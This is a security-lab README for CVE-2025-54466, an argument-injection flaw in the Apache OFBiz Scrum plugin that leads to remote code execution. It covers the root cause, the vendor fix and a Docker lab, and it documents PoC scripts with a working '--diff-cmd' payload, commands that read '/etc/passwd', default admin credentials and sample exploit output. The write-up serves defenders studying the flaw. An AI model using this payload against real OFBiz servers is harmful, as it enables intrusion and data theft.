# CVE-2025-54466 - Apache OFBiz Scrum Plugin SVN Argument Injection to RCE

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field | Value |
|---|---|
| CVE | CVE-2025-54466 |
| Component | [Apache OFBiz (Scrum Plugin)](https://ofbiz.apache.org/) |
| Type | CWE-94: Code Injection |
| CVSS | 9.8 (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| EPSS | 0.2% (36.2th percentile) |
| Affected | All versions before 24.09.02 (with scrum plugin enabled) |
| Fix | Version 24.09.02 — commit [`ae0c279b`](https://github.com/apache/ofbiz-plugins/commit/ae0c279b9c7bb91a36d038f2dab5941b09b1de09) |
| Author | Exploit Intelligence Platform |
| Date | 2026-03-01 |

## Vulnerability Details

CVE-2025-54466 is a **Critical (CVSS 9.8)** Remote Code Execution vulnerability in the Apache OFBiz Scrum plugin. The `viewScrumRevision()` and `retrieveMissingScrumRevision()` methods in `ScrumServices.java` construct `svn` shell commands by directly concatenating user-controlled HTTP parameters into command strings passed to `Runtime.getRuntime().exec(String)`. An attacker can inject SVN command-line flags — specifically `--diff-cmd=<binary>` — to execute arbitrary commands on the server, with output returned directly in the HTTP response (in-band RCE).

Java's `Runtime.exec(String)` does **not** invoke a shell — it tokenizes the command string by whitespace using `StringTokenizer` and passes the resulting tokens as `argv` to the OS. This prevents traditional shell metacharacter injection (`;`, `|`, `&&`), but enables **argument injection**: any whitespace-separated tokens in the `repository` parameter become additional command-line arguments to the `svn` binary.

The root cause is **direct concatenation of unsanitized user input** into OS command strings:

```java
String diffCommand = "svn diff -r" + (Integer.parseInt(revision.trim()) - 1)
    + ":" + revision + " " + repository;
Process diffProcess = Runtime.getRuntime().exec(diffCommand);
```

The SVN client's `--diff-cmd=<program>` flag specifies an external program to execute when displaying file differences. By injecting this flag, an attacker causes SVN to invoke an arbitrary binary, achieving Remote Code Execution. The executed command's stdout is captured by SVN, returned to OFBiz, and rendered directly in the HTTP response body via the FreeMarker template (`<pre>${result.diffMessage}</pre>`), making this an **in-band RCE**.

### Attack Chain

```
1. Authenticate to OFBiz (demo credentials admin/ofbiz)
2. Stage a shell script wrapper (written via bind mount)
3. Inject --diff-cmd=<script> via the repository parameter
4. Read command output from the HTTP response (in-band RCE)
```

### Injection Flow

```
HTTP Parameter:  repository = "--diff-cmd=/tmp/helper.sh /home/ofbiz/svnwc"
                                ↓
Java Code:       "svn diff -r1:2 " + repository
                 = "svn diff -r1:2 --diff-cmd=/tmp/helper.sh /home/ofbiz/svnwc"
                                ↓
Runtime.exec():  StringTokenizer splits by whitespace →
                 ["svn", "diff", "-r1:2", "--diff-cmd=/tmp/helper.sh", "/home/ofbiz/svnwc"]
                                ↓
SVN Client:      Executes /tmp/helper.sh as the external diff program
                                ↓
Output:          helper.sh stdout → captured by SVN → returned to Java → diffMessage
                 → rendered in HTTP response via <pre>${result.diffMessage}</pre>
```

### Fix

The fix (commit [`ae0c279b`](https://github.com/apache/ofbiz-plugins/commit/ae0c279b9c7bb91a36d038f2dab5941b09b1de09)) by Nicolas Malin applies three mitigations:

1. **Input Validation (Primary Defense):** Added `UtilValidate.isValidUrl(repository)` and `UtilValidate.isInteger(revision)` checks before command construction. `isValidUrl` delegates to Apache Commons `UrlValidator`, enforcing `scheme://host/path` format. Payloads like `--diff-cmd=/usr/bin/id file:///tmp/svnrepo` are rejected because they don't conform to valid URL syntax.

2. **Array-based `exec()` (Secondary Defense):** Changed from `Runtime.exec(String)` (whitespace-tokenized) to an array-based invocation. This prevents user input from being split into multiple arguments.

3. **Test Case:** Added `testViewScrumRevisionBadCall` that verifies injection payloads (e.g., `--diff+--diff-cmd=/bin/ls`) produce empty results.

**Assessment:** The fix is **complete and effective**. The `UrlValidator` check blocks all identified injection vectors. No bypass was found.

## Lab Setup

### Architecture

```
┌────────────────────────────────────────────────────────────────────┐
│  lab-net (bridge)                                                   │
│                                                                     │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │ cve-2025-54466-vulnerable                                     │  │
│  │ Apache OFBiz 24.09.01 + Scrum Plugin + SVN Client             │  │
│  │ Eclipse Temurin 17 JDK                                        │  │
│  │ Port: 8443 (HTTPS, self-signed cert)                          │  │
│  └───────────────────────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────────────────────┘
```

### Quick Start

```bash
cd CVE-2025-54466

# Build and start (~10 min first build — Gradle downloads dependencies)
docker compose build
docker compose up -d

# Wait for OFBiz to start (healthcheck has 180s start_period)
docker compose ps   # wait for "healthy" status

# Run the exploit
python3 poc/poc.py localhost 8443

# Cleanup
docker compose down
```

### Container Details

| Container | Role | Base | Host Port | Description |
|---|---|---|---|---|
| `cve-2025-54466-vulnerable` | Vulnerable target | `eclipse-temurin:17-jdk` | `8443` | OFBiz 24.09.01 with scrum plugin, SVN client, local SVN repo |

### Default Credentials

| Service | Username | Password |
|---|---|---|
| Apache OFBiz | `admin` | `ofbiz` |

## PoC Usage

Three PoC scripts are provided, each demonstrating a different attack vector. All are standalone Python 3 tools with **no external dependencies** (stdlib only).

### Vector 1: RCE via `svn diff --diff-cmd` (Primary)

**Script:** `poc/poc.py`

Exploits the `svn diff` command on line 150-151 of `ScrumServices.java`. Injects `--diff-cmd=<script>` to execute arbitrary commands, with output returned in the `diffMessage` field of the HTTP response.

```bash
# Execute 'id' on the target
python3 poc/poc.py localhost 8443 -c "id"

# Execute arbitrary commands
python3 poc/poc.py localhost 8443 -c "whoami; uname -a"

# Read sensitive files
python3 poc/poc.py localhost 8443 -c "cat /etc/passwd | head -5"
```

### Expected Output (Vulnerable)

```
======================================================================
CVE-2025-54466: Apache OFBiz Scrum Plugin — RCE via SVN Argument Injection
======================================================================
[*] Target: https://localhost:8443
[*] Command: id

[*] Authenticating as 'admin' to https://localhost:8443/scrum/control/login
[+] Authentication successful — session established

[*] Staging helper script at /tmp/.ofbiz_rce_helper.sh
[+] Helper script staged at /tmp/.ofbiz_rce_helper.sh

[*] Triggering SVN argument injection via viewScrumRevision()...
[*] Sending exploit to: /scrum/control/RevisionInfo
[*] Payload: repository=--diff-cmd=/tmp/.ofbiz_rce_helper.sh /home/ofbiz/svnwc
[*] Resulting svn command: svn diff -r1:2 --diff-cmd=/tmp/.ofbiz_rce_helper.sh /home/ofbiz/svnwc

======================================================================
[+] EXPLOIT SUCCESSFUL — Command output received in HTTP response:
======================================================================

uid=1001(ofbiz) gid=1001(ofbiz) groups=1001(ofbiz)

======================================================================
[+] Demonstrated: Remote Code Execution as OFBiz service account
[+] Vector: SVN --diff-cmd argument injection via 'repository' parameter
[+] In-band output: Command output returned in HTTP response body
```

### Vector 2: RCE via `svn log --diff --diff-cmd`

**Script:** `poc/poc_vector2.py`

Exploits the `svn log` command on line 143-144 — a different injection point. Injects `--diff --diff-cmd=<script>` to achieve RCE via the log command's inline diff feature. Output appears in `logMessage`.

```bash
python3 poc/poc_vector2.py localhost 8443 -c "id"
```

### Vector 3: Argument Injection Proof via `--xml`

**Script:** `poc/poc_vector3.py`

A non-destructive proof of argument injection. Injects `--xml` into the `svn log` command, causing the output format to change from plain text to XML. Demonstrates that user input controls SVN command-line flags without requiring RCE.

```bash
python3 poc/poc_vector3.py localhost 8443
```

## Verification: Vulnerable vs Patched

| Test | Vulnerable (< 24.09.02) | Patched (>= 24.09.02) |
|---|---|---|
| `--diff-cmd` injection | Command executed — RCE confirmed | Injection blocked — repository rejected by UrlValidator |
| `--xml` injection | Output changes from plain text to XML | Injection blocked — empty output returned |

## Files

| File | Description |
|---|---|
| `README.md` | This writeup |
| `poc/poc.py` | Primary RCE PoC — `svn diff --diff-cmd` injection |
| `poc/poc_vector2.py` | RCE via `svn log --diff --diff-cmd` injection |
| `poc/poc_vector3.py` | Argument injection proof via `--xml` flag |
| `Dockerfile.vulnerable` | OFBiz 24.09.01 with scrum plugin and SVN client |
| `docker-compose.yml` | Single-container lab orchestration |
| `entrypoint-wrapper.sh` | Patches host-headers-allowed with container IPs |
| `intel_brief.md` | CVE intelligence from EIP |
| `vulnerability_analysis.md` | Root cause trace and fix assessment |
| `poc_verification_report.md` | Full test results for all 3 vectors |
| `lab_build_report.md` | Lab construction and verification details |

## References

- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2025-54466)
- [GHSA Advisory](https://github.com/advisories/GHSA-7vg9-49f9-pfxr)
- [JIRA Issue (OFBIZ-13276)](https://issues.apache.org/jira/browse/OFBIZ-13276)
- [Apache Mailing List](https://lists.apache.org/thread/14d0yd9co9gx2mctd3vyz1cc8d39n915)
- [Release Notes (24.09.02)](https://ofbiz.apache.org/release-notes-24.09.02.html)
- [Fix Commit (release branch)](https://github.com/apache/ofbiz-plugins/commit/ae0c279b9c7bb91a36d038f2dab5941b09b1de09)
- [Fix Commit (trunk)](https://github.com/apache/ofbiz-plugins/commit/5a35b4f84f1314eed6bcdaca287e98a79b6ab1dd)
- [Apache Security Page](https://ofbiz.apache.org/security.html)
- [oss-security](http://www.openwall.com/lists/oss-security/2025/08/05/1)

## Timeline

| Date | Event |
|---|---|
| 2025-07-26 | Fix committed to `release24.09` branch by Nicolas Malin |
| 2025-08-05 | Public disclosure on oss-security mailing list |
| 2025-08-15 | CVE-2025-54466 published on NVD |
| 2025-08-15 | Apache OFBiz 24.09.02 released with the fix |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2025-54466 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
